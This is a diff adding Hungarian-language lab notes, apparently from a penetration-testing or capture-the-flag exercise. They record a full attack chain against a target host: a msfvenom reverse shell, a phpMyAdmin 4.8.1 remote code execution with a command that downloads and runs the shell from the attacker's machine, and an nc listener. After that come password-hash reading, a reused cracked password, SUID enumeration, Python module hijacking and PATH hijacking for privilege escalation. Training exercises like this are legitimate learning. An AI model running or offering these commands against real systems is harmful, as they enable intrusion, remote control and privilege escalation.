@@ -1,0 +1,115 @@
+Tamadnivalo gep: 40.0.5.11
+sajat ip: 30.0.1.12
+
+phpmyadmin remote code execution 4.8.1 (exploit database)
+
+
+msfvenom-webszerver shell:
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=sajatip LPORT=4444 -f elf > shell.elf
+python3 -m http.server 8000
+
+RCE shell:
+
+python3 mentett.py 40.0.5.11 80 /phpmyadmin pm pmapass 'cd /tmp;rm -f /tmp/shell.elf;wget http://sajatip/shell.elf;chmod 777 /tmp/shell.elf;/tmp/shell.elf'
+
+listener shell:
+
+nc -lvp 4444
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+ls -l /etc/passwd --> -rw-rw-r--+ (+ a vegen!)
+getfacl /etc/passwd (szetnezni), user:josh pl: josh tud irni az etc/passwdbe
+
+cat /etc/passwd : bob:$y$...: ig a jelszava (ha $y$ akkor crypt!)
+
+feltores ezelottibe, jelszo kingkong
+
+su bob
+password: kingkong
+
+
+UJANYAG
+
+listenerben vagyunk:
+
+find / -perm -u=s 2>/dev/null (suid bittel ellatott dolgokat ir ki) 
+
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/fusermount3
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/newgidmap
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/ntfs-3g
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/vmware-user-suid-wrapper
+/usr/lib/chromium/chrome-sandbox
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/lib/xorg/Xorg.wrap
+/usr/sbin/exim4
+/usr/sbin/pppd
+/usr/share/codium/chrome-sandbox
+
+uj gepen ezek suidbitesek
+
+ha talalunk olyat ami ebbe nincs a masik gepen akkor erdekesseg lehet
+
+gtfobins.github.io
+
+filter be ranezni, suid résznél kiirja a kodot, de python helyett pl python3 kell
+ezzel root lehetunk
+
+(/usr/bin/gdb az nem szerepel a sajátunkon de a masikon igen):
+
+weboldalra be, suid de nem mukszik mostani esetben
+
+
+bob sajat mappaja : ls
+
+
+fajl.py (import random valoszinuleg van meg valamilyen import)
+
+mivel van benne import random, ha keszitek egy random.py nevu python fájlt ugyanabba a mappaba:
+azóta is listenerbe
+
+echo 'import pty;pty.spawn("/bin/bash")' > random.py
+
+python3 pythonfajlneve.py
+
+
+sudo -l 
+aztán bob jelszava
+juliette lehet valni ha 
+
+sudo -u juliet copypaste az egesz /usr/...py
+
+sudo -l (julietkent) 3x elbaszni a jelszót ha nem jo
+
+cd /home/juliet
+
+find / -perm -u=s 2>/dev/null
+
+./message_from_josh
+
+message ben egy df parancs van:
+
+"ez nem jo 
+echo 'bash' > /tmp/df
+export PATH=/tmp:copypaste a maradek/usr/local/sbin... sort szokoz nelkul a : utan !!!!!
+
+chmod 777 /tmp/df
+"
+echo 'bash' > df
+chmod 777 df
+export PATH=/home/juliet:/tmp:/usr/local...copypaste
+./message_from_josh
+
+josh lettel
